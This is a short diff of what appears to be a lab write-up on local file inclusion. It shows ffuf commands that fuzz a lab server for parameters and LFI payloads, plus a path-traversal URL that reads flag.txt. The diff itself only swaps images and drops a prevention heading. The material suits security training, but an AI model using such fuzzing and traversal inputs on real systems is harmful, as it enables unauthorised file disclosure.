@@ -62,7 +62,7 @@ _**Fuzz the web application for exposed parameters, then try to exploit it with 
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://94.237.53.113:55545/index.php?FUZZ=value' -fs 2309
 ```
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://94.237.53.113:55545/index.php?view=FUZZ' -fs 1935
@@ -71,5 +71,3 @@ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http:
 <figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption><p><a href="http://94.237.53.113:55545/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt">http://94.237.53.113:55545/index.php?view=../../../../../../../../../../../../../../../../../../../../../../flag.txt</a></p></figcaption></figure>
-
-## File Inclusion Prevention
